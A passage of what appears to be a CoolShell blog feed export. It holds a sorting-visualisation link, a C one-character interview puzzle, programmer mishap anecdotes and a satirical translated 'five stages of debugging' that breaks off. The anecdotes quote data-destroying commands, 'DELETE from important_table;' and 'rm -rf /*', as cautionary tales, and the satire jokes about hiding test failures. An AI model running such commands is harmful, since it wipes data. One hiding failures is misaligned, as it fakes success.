	计算机专业的学生的生活是，只要你脑子还在转就work，脑子不转了，就睡2小时。（原来，国外的计算机大学的同学们在大学时就已在疯狂工作了，课都不上）（work是在校的学术作业项目（谢谢网友...">
<meta itemprop="datePublished" content="2011-03-17T17:55:38+08:00">
<meta itemprop="dateModified" content="2011-03-17T22:17:03+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3928.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3928.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="3.64">
<meta itemprop="ratingCount" content="11">
</div>
</div>
<div id="post-ratings-3928-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-03-17T17:55:38+08:00</pubDate>
<guid>https://coolshell.cn/articles/3928.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 可视化的排序过程 ]]></title>
<link>https://coolshell.cn/articles/3933.html</link>
<content><![CDATA[ 
<p>下面是一个日本程序员制做的一个<a href="http://jsdo.it/norahiko/oxIy/fullscreen" target="_blank">可视化的排序过程</a>，包括了各种经典的排序算法，你可以调整速度和需要排序的个数。酷壳以前也介绍过几篇相关的文章 <a title="一个排序算法比较的网站" rel="bookmark" href="https://coolshell.cn/articles/399.html" target="_blank">一个排序算法比较的网站</a>，<a title="一个显示排序过程的Python脚本" rel="bookmark" href="https://coolshell.cn/articles/536.html" target="_blank">一个显示排序过程的Python脚本</a> 关于各种排序算法的运行复杂度比较，请参看<a href="https://en.wikipedia.org/wiki/Sorting_algorithm#Comparison_of_algorithms" target="_blank">Wikipedia的排序算法比较</a>。</p>
<p align="center"><iframe loading="lazy" src="https://jsrun.it/norahiko/oxIy" width="630" height="320" frameborder="0"><br>
</iframe></p>
<p></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/2583.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/2583.html" class="wp_rp_title">一些重要的算法</a>
</li>
<li>
<a href="https://coolshell.cn/articles/536.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/536.html" class="wp_rp_title">一个显示排序过程的Python脚本</a>
</li>
<li>
<a href="https://coolshell.cn/articles/399.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/399.html" class="wp_rp_title">一个排序算法比较的网站</a>
</li>
<li>
<a href="https://coolshell.cn/articles/12052.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12052.html" class="wp_rp_title">Leetcode 编程训练</a>
</li>
<li>
<a href="https://coolshell.cn/articles/6010.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/6010.html" class="wp_rp_title">一些有意思的算法代码</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4671.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4671.html" class="wp_rp_title">可视化的数据结构和算法</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3933" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="4c51d45da2">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>66</strong> 人打了分，平均分： <strong>4.82</strong> )<br><span class="post-ratings-text" id="ratings_3933_text"></span><meta itemprop="name" content="可视化的排序过程">
<meta itemprop="headline" content="可视化的排序过程">
<meta itemprop="description" content="下面是一个日本程序员制做的一个可视化的排序过程，包括了各种经典的排序算法，你可以调整速度和需要排序的个数。酷壳以前也介绍过几篇相关的文章 一个排序算法比较的网站，一个显示排序过程的Python脚本 关于各种排序算法的运行复杂度比较，请参看Wikipedia的排序算法比较。



">
<meta itemprop="datePublished" content="2011-03-18T08:42:56+08:00">
<meta itemprop="dateModified" content="2011-03-18T10:22:42+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3933.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3933.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.82">
<meta itemprop="ratingCount" content="66">
</div>
</div>
<div id="post-ratings-3933-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-03-18T08:42:56+08:00</pubDate>
<guid>https://coolshell.cn/articles/3933.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ “火柴棍式”程序员面试题 ]]></title>
<link>https://coolshell.cn/articles/3961.html</link>
<content><![CDATA[ 
<p>有时候，有些面试题是很是无厘头，这不，又有一个，还记得小时候玩的的“火柴棍游戏”吗，就是移动一根火柴棍改变一个图或字的游戏。程序面试居然也可以这么玩，看看下面这个火柴棍式的程序面试题吧。</p>
<p>下面是一个C程序，其想要输出20个减号，不过，粗心的程序员把代码写错了，你需要把下面的代码修改正确，不过，<strong>你只能增加或是修改其中的一个字符</strong>，请你给出三种答案。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">int n = 20;

for(int i = 0; i &lt; n; i--){
    printf("-");
}</pre>
<p>不要以为这题不是很难，我相信你并不那么容易能找到3种方法。我觉得，如果你能在10分钟内找出这三种方法，说明你真的很聪明，而且反应很快。当然，15分钟内也不赖。不过，你要是30分钟内找不到三种方法，当然，不说明你笨了，最多就是你的反应还不够快。嘿嘿。就当是玩玩吧。</p>
<p>下面是我的答案：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">//第一种解法：在for循环中给n加一个负号
for(int i = 0; i &lt; -n; i--)

//第二种解法：把 n 初始化成 -20
int n = -20;

//第三种解法：把for循环中的 i 初始化成40
for(int i = 40; i &lt; n; i--)
</pre>
<p>不过，我要告诉你，<span style="color: #cc0000;">以上这些答案都不对（我就知道你会偷看答案的）</span>，不过，顺着这些思路走很接近了。呵呵。</p>
<p>下面是正确答案——</p>
<p><span id="more-3961"></span></p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">//第一种解法：在for循环中给 i 加一个负号
for(int i = 0; -i &lt; n; i--)

//第二种解法：在for循环中把 i-- 变成 n--
for(int i = 0; i &lt; n; n--)

//第三种解法：把for循环中的 &lt; 变成 +
for(int i = 0; i + n; i--)
</pre>
<p>其它相关的变种题如下：</p>
<ul>
<li>通过修改、增加一个字符，让其输出21个减号</li>
<li>通过修改、增加一个字符，让其只输出1个减号</li>
<li>通过修改、增加一个字符，让其不输出减号</li>
</ul>
<p>（全文完）</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/7965.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/7965.html" class="wp_rp_title">一个fork的面试题</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4162.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4162.html" class="wp_rp_title">又一个有趣的面试题</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3738.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3738.html" class="wp_rp_title">打印质数的各种算法</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3445.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3445.html" class="wp_rp_title">输出从1到1000的数</a>
</li>
<li>
<a href="https://coolshell.cn/articles/12052.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12052.html" class="wp_rp_title">Leetcode 编程训练</a>
</li>
<li>
<a href="https://coolshell.cn/articles/10478.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/10478.html" class="wp_rp_title">C++面试中string类的一种正确写法</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3961" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="e930d29681">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>46</strong> 人打了分，平均分： <strong>4.61</strong> )<br><span class="post-ratings-text" id="ratings_3961_text"></span><meta itemprop="name" content="“火柴棍式”程序员面试题">
<meta itemprop="headline" content="“火柴棍式”程序员面试题">
<meta itemprop="description" content="有时候，有些面试题是很是无厘头，这不，又有一个，还记得小时候玩的的“火柴棍游戏”吗，就是移动一根火柴棍改变一个图或字的游戏。程序面试居然也可以这么玩，看看下面这个火柴棍式的程序面试题吧。

下面是一个C程序，其想要输出20个减号，不过，粗心的程序员把代码写错了，你需要把下面的代码修改正确，不过，你只能增加或是修改其中的一个字符，请你给出三种答案。

[c]int n = 20;

fo...">
<meta itemprop="datePublished" content="2011-03-21T08:28:31+08:00">
<meta itemprop="dateModified" content="2011-10-13T14:28:31+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3961.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3961.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.61">
<meta itemprop="ratingCount" content="46">
</div>
</div>
<div id="post-ratings-3961-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-03-21T08:28:31+08:00</pubDate>
<guid>https://coolshell.cn/articles/3961.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 程序员那些悲催的事儿 ]]></title>
<link>https://coolshell.cn/articles/3980.html</link>
<content><![CDATA[ 
<p>在StakeOverflow上有这样一个贴子叫“<a title="Confessions of your worst WTF moment" href="https://stackoverflow.com/questions/63668/confessions-of-your-worst-wtf-moment" target="_blank">Confessions of your worst WTF moment</a>”（WTF就是What the fuck的缩写），挺有意思的，我摘几个小故事过来，希望大家在笑过之后能从中学到什么——<strong>所有的经验都是从错误中来的</strong>（我在其中加了一些点评）</p>
<blockquote><p>我们公司的软件是给警察局用的，那是一个对用来处理被逮捕的人的系统，此系统还需要收集脸部特征和指纹信息，并且，这个系统和会向FBI的系统提交这些信息。当我们在测试这个系统的时候，我们一般都是用我们自己的指纹，当然，数据库联着的是我们的测试数据库。不过，有一次，在我们测试完后，我们忘了把系统切换回生产库，于是我们的测试数据库就联上了生产环境，于是我们的指纹信息和照片就散布到了其它系统中……清除我们警察局这边的还好办，但是，你需要波士顿警察局警司去法院签字才能从FBI的数据库中清除我们的信息。</p></blockquote>
<p style="padding-left: 30px;"><strong>点评</strong>：测试环境和生产环境的数据不要混在一起。</p>
<blockquote><p>有一次，我需要向新系统中导入一堆数据，因为数据量太大，需要5个小时，只能在夜里来干，在系统需要正式使用前2个小时，数据导完了，此时是凌晨4点。随后，我需要删除一些数据，于是我在SQL命令地上输入了“DELETE from important_table; where id=4”。是的，我没有看到哪里还有个分号，天啊。</p></blockquote>
<p style="padding-left: 30px;"><strong>点评</strong>：这就是加班工作的恶果。另，在delete之前最好先做一次select。</p>
<blockquote><p>我把我的管理员口令提交到了一个开源软件的源码里。</p></blockquote>
<p style="padding-left: 30px;"><strong>点评：</strong>1）版本管理器里的东西是删不掉的。2）一些用户和口令要hard code在代码里，所以，不要混用代码使用的权限和管理员的权限，小心管理程序的运行权限，为其注册专门的用户。</p>
<p><span id="more-3980"></span></p>
<blockquote><p>我为一个很大的银行开发软件，在我的代码里，我为一段理论上根本不可能执行到的代码加了一个报错信息。有一天，不可思异的事发生了，这条报错信息显示在了该银行的1800个分行的超过10000个终端上——“如果你看到这个信息，说明整个系统被Fuck了，回家吧，祝你过得愉快！”</p></blockquote>
<p style="padding-left: 30px;"><strong>点评：“</strong>假设是恶魔”，Assume意为Ass – u – me，意为——搞砸你和我。对于一些关键东西，永远不要做假设。小心你言语中的——“可能、应该、觉得、不应该”等词语，程序可不认这些东西。</p>
<blockquote><p>我远程登录到服务器上加几个防火墙规则。第一件我想干的事是在不允许任何人的任何连接，第二件是，为某个端口打开访问权限。不过，我在做完第一件事后就把配置保存了，结果其生效了……</p></blockquote>
<p style="padding-left: 30px;"><strong>点评</strong>：这样的事经常发生，做远程网络管理的人多少会有那么几次发生这样的错误。在你将你的网络配置生效前，你得想一想，断线了你是否还能登得上去。改配置不要太冲动，生效前检查几次。</p>
<blockquote><p>我们的代码中有一个模块完美地工作了很多年了，只是代码太乱了。我说服了我的老板，我可以重写这个模块，于是我花了三个星期来重写这个模块。今天 ，我还记得，我的老板站在我的后面看着我，而我在在流着斗大的法汗珠去fix被我重写的“超级漂亮”的那个模块中一个接一个的bug。从那以后，我再也不重写代码了，除非有重大的利益。</p></blockquote>
<p style="padding-left: 30px;"><strong>点评：</strong>这就所谓的<a title="各种流行的编程风格" href="https://coolshell.cn/articles/2058.html" target="_blank">屠宰式编程</a>。这个案例告诉我们两个道理，1）维护代码要用最最最保守的方法来进行。2）重构代码前要像一个商人一样学会计算利益。当然，<a title="再谈敏捷和ThoughtWorks中国咨询师" href="https://coolshell.cn/articles/3745.html" target="_blank">ThoughtWorks的咨询师</a>一定会告诉你TDD，结对，极限等等方法告诉你如果实践重构。但我想告诉你，一个程序在生产环境里运行好几个年能没有问题是一件很不容易的事，那怕其中的代码再烂，你再看不过去，你都要有一个清醒的头脑明白这几点，<strong>1）软件的运行质量是远远大于代码质量的，2）你的测试案例是远远小于生产环境的，3）软件的完美的质量，是靠长时间的运行、测试和错误堆出来的，而不是某种方法论</strong>。</p>
<p>————————————————</p>
<p>相信大家做程序员这一生中也有很多发生在自己身上的悲催的事儿，欢迎分享。我先分享几个我亲身经历过的事。</p>
<p>一个发生在我的领导身上。</p>
<blockquote><p>我98年刚参加工作的时候，在某单位网络部门，一次，我们整个部门去给下属单位培训Cisco路由器，结果我们发现带去培训地点的设备少带了集线器HUB，设备连不起来。于是领导很不高兴，质问我们为什么没有带集线器？那几个对领导平时就不满的老员工说办公室里没有集线器了，都借给别的部门了。领导想了想，问我：“陈皓，我记得上次我给过你个集线器”，我说，“好像没有吧，我记不起来了，什么牌的？几口的？”，领导说：“什么牌子想不起来了，不过我记得那个集线器是<strong>一个口</strong>的”。“一个口的？！”，我心里嘀咕着，“真敢说啊”。但我不敢接话了。那几个老员工来劲了——“哪有一个口的HUB啊，一个口的怎么联两台电脑啊？”，领导说：“用两个一个口的不就行了”。领导这话一出，全场一片寂静，无言以对……</p></blockquote>
<p style="padding-left: 30px;"><strong>后来：</strong>我们所有的组员都离开了我们的这个领导，我们的这个领导今天还在那里工作。我想告诉大家，<strong>很多时候该走的是领导</strong>（包括外企，我上一东家正在裁人，不过我觉得该被裁掉的应该是那些经理）。我们的领导经常出这样或那样的笑话，这让我随时随地地警醒自己——“<strong>不要当一个被人笑话的经理</strong>”，于是，今天我还在努力地学习技术。</p>
<p>另一个发生在我身上</p>
<blockquote><p>刚刚接触Linux的时候，还不是很懂，那时的PC还只有奔3，编译公司的程序好慢啊，有时候为了调查一个问题，需要不断地打log，来来回回地编译，很不爽。直到有一天，硬盘不够了，df一下，发现/dev/shm还有空间。于是，把全部程序copy了过去，发现编译起程序超快无比，爽得不行。于是就把工作环境放在/dev/shm下了，连开发都放在这里了。这一天，开发一个功能，改了十来个文件，加班很晚，觉得基本搞定，大喜，回家睡觉。第二天一来，发现/dev/shm下空了，一个文件都没有了，问同事，同事不知，同事还安慰我说，上次他的文件也不知道被 谁删了，于是我大怒，告老板！老板也怒，发邮件到整个公司质问大家谁删了陈皓的程序，无人应答。IT部门答，“昨晚唯一的操作就是重启了linux服务器，什么也没干，不过我们天天备份服务器，可以恢复”，IT部门问我丢的文件在哪个目录下？于是，我reply to all – “在/dev/shm下……”，哎，人丢大发了……</p></blockquote>
<p style="padding-left: 30px;"><strong>后来：</strong>我很感谢我以前犯的这个错，从那天以后，我开始立志学好Linux，这个错误让我努力，让我发奋。所以，我想告诉大家——<strong>尤其是刚出道的程序员，你们要多多犯错，要犯错那种丢死人的错，这样你才会知耻而勇</strong>。</p>
<p>再来一个发生在我同事身上的</p>
<blockquote><p>01年，我们开发银行系统，在AIX上开发，RICS6000很贵，只能在客户那里开发，开发进度很紧张，慢慢地硬盘就不够用了，系统中有大量的垃圾文件，于是需要清除一些文件，于是有一个同事写了一个脚本，可以自动清除的各种不重要的文件，里面有一条命令大致是这个样子“ rm -rf ${app_log_dir}/*”，意为清除程序运行的日志。为了使用这个脚本，需要在root用户下运行，一开始还不错。直到有一天，某人一运行，整个根就没了。搞得整个团队只能用一周前的备份重写已写好的代码。后来，才发现原因是${app_log_dir}变量为空，于是成了“rm -rf /*”……</p></blockquote>
<p style="padding-left: 30px;"><strong>后来：</strong>这个事后，我的那个同事，把rm命令改了名，并自己写了一个rm命令，把删除的文件先放到一个临时目录下。而我也因为这个事情，到今天，每次当我在root目录下使用rm时，敲击回车的手都是抖的。（另，rm时永远使用绝对路径）这里，我想告诉大家——<strong>犯错不可怕，可怕的是不会从中总结教训，同一个错犯两次</strong>。</p>
<p>欢迎分享发生在你身上那些悲催的事。</p>
<p><strong>（本文请勿用于商业用途，转载时请注明作者和出处）</strong></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/21589.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/21589.html" class="wp_rp_title">如何做一个有质量的技术分享</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20977.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20977.html" class="wp_rp_title">程序员如何把控自己的职业</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20765.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20765.html" class="wp_rp_title">MegaEase的远程工作文化</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20276.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20276.html" class="wp_rp_title">别让自己“墙”了自己</a>
</li>
<li>
<a href="https://coolshell.cn/articles/19612.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/19612.html" class="wp_rp_title">50年前的登月程序和程序员有多硬核</a>
</li>
<li>
<a href="https://coolshell.cn/articles/19464.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/19464.html" class="wp_rp_title">如何超过大多数人</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3980" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="e5da50370e">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>51</strong> 人打了分，平均分： <strong>4.69</strong> )<br><span class="post-ratings-text" id="ratings_3980_text"></span><meta itemprop="name" content="程序员那些悲催的事儿">
<meta itemprop="headline" content="程序员那些悲催的事儿">
<meta itemprop="description" content="在StakeOverflow上有这样一个贴子叫“Confessions of your worst WTF moment”（WTF就是What the fuck的缩写），挺有意思的，我摘几个小故事过来，希望大家在笑过之后能从中学到什么——所有的经验都是从错误中来的（我在其中加了一些点评）
我们公司的软件是给警察局用的，那是一个对用来处理被逮捕的人的系统，此系统还需要收集脸部特征和指纹信息，并且，...">
<meta itemprop="datePublished" content="2011-03-22T08:55:30+08:00">
<meta itemprop="dateModified" content="2011-03-22T11:17:12+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3980.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3980.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.69">
<meta itemprop="ratingCount" content="51">
</div>
</div>
<div id="post-ratings-3980-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-03-22T08:55:30+08:00</pubDate>
<guid>https://coolshell.cn/articles/3980.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Fix Bug的五个阶段 ]]></title>
<link>https://coolshell.cn/articles/4045.html</link>
<content><![CDATA[ 
<p>下面的文章和《<a title="各种流行的编程风格" href="https://coolshell.cn/articles/2058.html" target="_blank">各种流行的编程方式</a>》有异曲同工，请你不要理解错了。<strong><a title="THE FIVE STAGES OF DEBUGGING" href="http://crankypm.com/2011/03/guest-post-stages-debugging/?utm_source=feedburner&amp;utm_medium=feed&amp;utm_campaign=Feed:+TheCrankyProductManager+(The+Cranky+Product+Manager)" target="_blank">本文来源</a></strong>，翻译如下：</p>
<p>——————————————————</p>
<p>一个非常严重和困难的bug，能够成就一个饱经沧桑深受压力的有经验的专业程序员的职业生涯。经受这种考验的创伤程度，相当你受到了一次严重的身体伤害，离婚，或是家庭成为的离世。</p>
<p>研究人员在研究了计算机编程心理学后，得出了一个程序员们在解决一个困难的bug时的心路里程。这些不同的境界，很像为大众所知的<a href="https://en.wikipedia.org/wiki/K%C3%BCbler-Ross_model" target="_blank">Kübler-Ross Stages of Grief</a>（这个模型描述了人对待哀伤与灾难过程中的5个独立阶段（否认，愤怒，耍赖，抑郁，接受）。绝症患者被认为会经历这些阶段），而且原因都很相似。就好像死亡所伴随的悲伤一样，fix一个bug是一个过程其初始化了一个事件，一开始是拒绝相信，其造就了你苦闷的情绪并开始逐步影响你的心智。这种苦闷的情结果会让你纠结要努力忍受，最终会你会找到一个满意的结果。</p>
<p>了解下面这几个bug-fixing的阶段，会让我们更好的生存下来，并持之以恒，最终带来……关闭我们所有的bug的结果。</p>
<h2>第一阶段：抵触</h2>
<p>本阶段的状态: 多疑 Skeptical. 生气 Offended. 易怒 Petulant.</p>
<p><strong>1. 不理睬</strong></p>
<p>也许这个bug会安静地离开。</p>
<p><strong>2. 标记上“不是bug”</strong></p>
<p>也许这是用户的错，或是本地配置有问题。是的，我确信就是那样，一会就会好的。</p>
<p><span id="more-4045"></span></p>
<p><strong>3. 就是一次小故障</strong></p>
<p>我想这就是一次小故障，很奇怪地发生了一次，它不会再发生的，虽然没有搞清楚是为什么发生了，不过这就好像我们的数据库，网格，浏览器或别的什么打了几个嗝一样。一会就会好的，我确信。</p>
<p><strong>4. 躲藏.</strong></p>
<p>我要休几天病假，也许他们会把这个bug转给别人的。</p>
<p><strong>5. 标记为“修改需求中”</strong></p>
<p>你看，我是按照需求实现的。如果你们想要改这个行为和UI，就一定要修改需求。也许他们会决定就这样了。</p>
<p><strong>6. 需要更多的信息</strong></p>
<p>我不能确定这是一个bug，除非我能在错误日志中看到一条特定的报错信息。</p>
<p><strong>7. 转给其他人</strong></p>
<p>我调查这个bug中看到了其它模块中我看不懂的数据，问题很大。我应该把这个bug转给开发那个模块的人。我可以在我的模块中检查一下那个边边角角的情况，但是正确的fix应该是在别人的模块中。反正那个在别的国家，我见不着他。</p>
<h2>第二阶段：接受</h2>
<p>本阶段的状态: 认命 Resigned. 被打击 Defeated. 被激怒 Annoyed.</p>
<p><strong>1. 接受现实</strong></p>
<p>行了，行了，行了！这是我的bug，我会修正它的。</p>
<p><strong>2. 把这个bug放到最后</strong></p>
<p>也许，我可以在我需要fix这个bug之前找到一个新的工作。</p>
<p><strong>3. 和你的经理讨价还价</strong></p>
<p>好的，你看，我可以正确地fix这个问题，不过我需要一个月。也就是说，我可以给这个问题贴个创可贴，那不会真正的解决它，但是我们可以避免用户的抱怨，这可以为我们赢得几天的时间。</p>
<p><strong>4. 为这个bug标记一个无耻的时间</strong></p>
<p>上帝啊，我希望这时间够了。</p>
<h2>第三阶段： 投入和沮丧</h2>
<p>本阶段的状态: 眼花 Giddy. 头晕 Light-headed. 紧张 Nauseous.</p>
<p><strong>1. 开始调查</strong></p>
<p>我能搞定它，我能搞定它！只需要小小的调整一下，小小的关注一下，多一点咖啡因，再加上一点时间，我能搞定它。</p>
<p><strong>2. 迷惘</strong></p>
<p>Shit. 这太扯了。我居然没有一点进展。这代码真是乱。这样的代码居然能编译和运行，真TMD的神奇，我有机会能搞清楚它什么不正常吗？</p>
<p><strong>3. 再次躲藏</strong></p>
<p>你看，很对不起。我不得不要去切除我的阑尾。再一次，是的，既然你提到了它，我的确有两个阑尾。现在我一个也没有了，你高兴了吧？。</p>
<p><strong>4. 犯贱</strong></p>
<p>好吧，总之，你到底期望什么？想让我在一个没有高级调试器的环境下改这个BUG。我是什么？千里眼吗？我在我的<a href="https://en.wikipedia.org/wiki/Commodore_64" target="_blank">Commodore 64</a>上一个更好的调试器！</p>
<p><strong>5. 瞎搞</strong></p>
<p>看看我试试这么改？Kao，这样不行。要不然这样搞？也不行。那么那样搞呢？Shit，居然变得更糟了。</p>
<p><strong>6. 绝望</strong></p>
<p>我不可能fix这个bug了。我是个糟糕的程序员。我太笨了。我在这个满是聪明人的地方干什么？迟早他们会知道我的能力太差，那时我就玩完了，在这也混不下去了。</p>
<p><strong>7.耻辱</strong></p>
<p>我的经理问我为什么我用了一个月的时候来fix这个只需要两天就可以解决的bug？老实说，我不知道怎么去读日志信息，我搞坏了我们的编译脚本。现在，我不敢去让别人来帮我，因为这样只会让我显得更愚蠢。</p>
<p><strong>8. 恐慌！</strong></p>
<p>这事变得比我相像的要复杂！而我开始觉得复杂的事变得简单……而我觉得简单的事变成需要重定半打的类。为什么我以前在我的经理前拍着胸说我可以搞定这个事？</p>
<p><strong>9. 通宵工作，远离朋友和家人</strong></p>
<p>(语无论次的喃喃自语，一阵一阵地大声咒骂)</p>
<h2>第四个阶段：愚蠢的快感</h2>
<p>本阶段的状态: 感恩 Grateful. 安心 Relieved. 极端地自我欣赏 Awfully Impressed with Yourself.</p>
<p><strong>1. 醒悟 </strong></p>
<p>哦！我终于明白怎么搞定它了……</p>
<p><strong>2. 写正确的代码</strong></p>
<p>我真NB，我是编码机器！</p>
<p><strong>3. 测试</strong></p>
<p>牛！通过一个测试。真牛！又通过一个测试了。靠！有测试失败了。这是为什么……</p>
<p><strong>4. 隐藏测试失败</strong></p>
<p>反正这完全是一个不重要的测试案例。没有人会检查它，这个测试真是毫无意义。</p>
